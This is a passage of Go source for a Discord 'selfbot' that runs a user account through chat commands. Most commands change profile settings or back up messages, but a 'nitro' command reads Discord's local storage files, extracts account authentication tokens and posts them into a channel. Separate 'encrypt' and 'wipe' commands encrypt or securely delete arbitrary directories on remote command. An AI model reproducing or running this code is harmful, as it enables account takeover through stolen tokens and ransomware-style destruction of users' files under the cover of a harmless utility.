      resp, err := bot.makeRequest("PATCH", "/users/@me/settings", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Now listening to: %s", song))
      } else {
          bot.SendMessage(channelID, "Failed to set listening status")
      }
  }

  func (d *DiscordSelfbot) cmdWatching(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: watching <content_name>")
          return
      }

      content := strings.Join(args, " ")

      payload := map[string]interface{}{
          "custom_status": nil,
          "activities": []map[string]interface{}{
              {
                  "name": content,
                  "type": 3,
              },
          },
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", "/users/@me/settings", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Now watching: %s", content))
      } else {
          bot.SendMessage(channelID, "Failed to set watching status")
      }
  }

  func (d *DiscordSelfbot) cmdAFK(bot *DiscordSelfbot, channelID string, args []string) {
      payload := map[string]interface{}{
          "status": "idle",
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", "/users/@me/settings", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, "Set AFK status")
      } else {
          bot.SendMessage(channelID, "Failed to set AFK status")
      }
  }

  func (d *DiscordSelfbot) cmdNick(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: nick <guild_id> <nickname>")
          return
      }

      guildID := args[0]
      nickname := strings.Join(args[1:], " ")

      payload := map[string]interface{}{
          "nick": nickname,
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", fmt.Sprintf("/guilds/%s/members/@me/nick", guildID),
  bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Changed nickname to: %s", nickname))
      } else {
          bot.SendMessage(channelID, "Failed to change nickname")
      }
  }

  func (d *DiscordSelfbot) cmdNickReset(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: nick-reset <guild_id>")
          return
      }

      guildID := args[0]

      payload := map[string]interface{}{
          "nick": "",
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", fmt.Sprintf("/guilds/%s/members/@me/nick", guildID),
  bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, "Reset nickname")
      } else {
          bot.SendMessage(channelID, "Failed to reset nickname")
      }
  }

  func (d *DiscordSelfbot) cmdAvatar(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: avatar <image_url>")
          return
      }

      imageURL := args[0]

      resp, err := http.Get(imageURL)
      if err != nil {
          bot.SendMessage(channelID, "Failed to download image")
          return
      }
      defer resp.Body.Close()

      imageData, err := io.ReadAll(resp.Body)
      if err != nil {
          bot.SendMessage(channelID, "Failed to read image data")
          return
      }

      encoded := base64.StdEncoding.EncodeToString(imageData)

      payload := map[string]interface{}{
          "avatar": fmt.Sprintf("data:image/png;base64,%s", encoded),
      }

      jsonData, _ := json.Marshal(payload)
      resp2, err := bot.makeRequest("PATCH", "/users/@me", bytes.NewBuffer(jsonData))
      if err == nil {
          resp2.Body.Close()
          bot.SendMessage(channelID, "Changed avatar")
      } else {
          bot.SendMessage(channelID, "Failed to change avatar")
      }
  }

  func (d *DiscordSelfbot) cmdUsername(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: username <new_username>")
          return
      }

      username := strings.Join(args, " ")

      payload := map[string]interface{}{
          "username": username,
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", "/users/@me", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Changed username to: %s", username))
      } else {
          bot.SendMessage(channelID, "Failed to change username")
      }
  }

  func (d *DiscordSelfbot) cmdBio(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: bio <new_bio>")
          return
      }

      bio := strings.Join(args, " ")

      payload := map[string]interface{}{
          "bio": bio,
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("PATCH", "/users/@me", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Changed bio to: %s", bio))
      } else {
          bot.SendMessage(channelID, "Failed to change bio")
      }
  }

  func (d *DiscordSelfbot) cmdHypeSquad(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: hypesquad <bravery/balance/brilliance>")
          return
      }

      house := args[0]
      var houseID int

      switch strings.ToLower(house) {
      case "bravery":
          houseID = 1
      case "balance":
          houseID = 2
      case "brilliance":
          houseID = 3
      default:
          bot.SendMessage(channelID, "Invalid house. Use: bravery, balance, or brilliance")
          return
      }

      payload := map[string]interface{}{
          "house_id": houseID,
      }

      jsonData, _ := json.Marshal(payload)
      resp, err := bot.makeRequest("POST", "/hypesquad/online", bytes.NewBuffer(jsonData))
      if err == nil {
          resp.Body.Close()
          bot.SendMessage(channelID, fmt.Sprintf("Changed HypeSquad house to: %s", house))
      } else {
          bot.SendMessage(channelID, "Failed to change HypeSquad house")
      }
  }

  func (d *DiscordSelfbot) cmdNitro(bot *DiscordSelfbot, channelID string, args []string) {
      paths := []string{
          os.Getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
          os.Getenv("LOCALAPPDATA") + "\\Discord\\Local Storage\\leveldb",
      }

      var nitroTokens []string

      for _, path := range paths {
          files, err := os.ReadDir(path)
          if err != nil {
              continue
          }

          for _, file := range files {
              if strings.HasSuffix(file.Name(), ".log") || strings.HasSuffix(file.Name(), ".ldb") {
                  content, _ := os.ReadFile(path + "\\" + file.Name())
                  tokenRegex := regexp.MustCompile(`[0-9]{17,19}\.[a-zA-Z0-9\-_]{23,28}\.[a-zA-Z0-9\-_]{27}`)
                  matches := tokenRegex.FindAllString(string(content), -1)

                  for _, match := range matches {
                      parts := strings.Split(match, ".")
                      if len(parts) == 3 {
                          nitroTokens = append(nitroTokens, match)
                      }
                  }
              }
          }
      }

      if len(nitroTokens) > 0 {
          var response strings.Builder
          response.WriteString("Found potential Nitro tokens:\n")

          for _, token := range nitroTokens {
              response.WriteString(fmt.Sprintf("- %s\n", token))
          }

          bot.SendMessage(channelID, response.String())
      } else {
          bot.SendMessage(channelID, "No Nitro tokens found")
      }
  }

  func (d *DiscordSelfbot) cmdBackup(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: backup <channel_id> <limit>")
          return
      }

      targetChannel := args[0]
      limit := 100
      if len(args) > 1 {
          if l, err := strconv.Atoi(args[1]); err == nil {
              limit = l
          }
      }

      messages, err := bot.GetMessages(targetChannel, limit)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to get messages: %v", err))
          return
      }

      filename := fmt.Sprintf("backup_%s.json", time.Now().Format("20060102_150405"))
      file, err := os.Create(filename)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to create backup file: %v", err))
          return
      }
      defer file.Close()

      encoder := json.NewEncoder(file)
      encoder.SetIndent("", "  ")
      err = encoder.Encode(messages)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to write backup file: %v", err))
          return
      }

      bot.SendMessage(channelID, fmt.Sprintf("Backup saved to: %s", filename))
  }

  func (d *DiscordSelfbot) cmdRestore(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: restore <backup_file>")
          return
      }

      filename := args[0]

      file, err := os.Open(filename)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to open backup file: %v", err))
          return
      }
      defer file.Close()

      var messages []MessageEvent
      err = json.NewDecoder(file).Decode(&messages)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Failed to read backup file: %v", err))
          return
      }

      for _, msg := range messages {
          bot.SendMessage(channelID, msg.Content)
          time.Sleep(500 * time.Millisecond)
      }

      bot.SendMessage(channelID, "Backup restored!")
  }

  func (d *DiscordSelfbot) cmdEncrypt(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: encrypt <directory>")
          return
      }

      directory := args[0]

      err := bot.encryptDirectory(directory)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Encryption failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "Directory encrypted successfully!")
  }

  func (d *DiscordSelfbot) cmdDecrypt(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) < 2 {
          bot.SendMessage(channelID, "Usage: decrypt <directory> <key>")
          return
      }

      directory := args[0]
      key := args[1]

      err := bot.decryptDirectory(directory, []byte(key))
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Decryption failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "Directory decrypted successfully!")
  }

  func (d *DiscordSelfbot) cmdWipe(bot *DiscordSelfbot, channelID string, args []string) {
      if len(args) == 0 {
          bot.SendMessage(channelID, "Usage: wipe <directory>")
          return
      }

      directory := args[0]

      err := bot.securelyDeleteDirectory(directory)
      if err != nil {
          bot.SendMessage(channelID, fmt.Sprintf("Secure deletion failed: %v", err))
          return
      }

      bot.SendMessage(channelID, "Directory securely deleted!")
  }

  func (d *DiscordSelfbot) cmdHelp(bot *DiscordSelfbot, channelID string, args []string) {
      var response strings.Builder
      response.WriteString("Available commands:\n\n")

      for name, cmd := range bot.Commands {
          response.WriteString(fmt.Sprintf("!%s - %s\n", name, cmd.Description))
      }

      response.WriteString("\nUse !help <command> for detailed information about a specific command.")

      if len(response.String()) > 1900 {
          parts := strings.Split(response.String(), "\n")
          current := ""

          for _, part := range parts {
              if len(current)+len(part)+1 > 1900 {
                  bot.SendMessage(channelID, current)
                  current = part
              } else {
                  if current != "" {
                      current += "\n"
                  }
                  current += part
              }
          }

          if current != "" {
              bot.SendMessage(channelID, current)
          }
      } else {
          bot.SendMessage(channelID, response.String())
      }
  }

  func (d *DiscordSelfbot) Run() error {
      err := d.Authenticate()
      if err != nil {
          return err
      }

      fmt.Println("[+] Selfbot is running...")

      for d.Running {
          time.Sleep(100 * time.Millisecond)
      }

      return nil
  }

  func main() {
      if len(os.Args) < 2 {
          fmt.Println("Usage: test-selfbot <user_token>")
          fmt.Println("Example: Ur token lol")
          os.Exit(1)
      }

      token := os.Args[1]

      if !isValidToken(token) {
          fmt.Println("[-] Invalid token format")
          os.Exit(1)
      }

      bot := NewDiscordSelfbot(token)
      bot.initializeCommands()

      err := bot.Run()
      if err != nil {
          log.Fatal("Selfbot error:", err)
      }
  }

  func isValidToken(token string) bool {
      parts := strings.Split(token, ".")
      return len(parts) == 3
  }
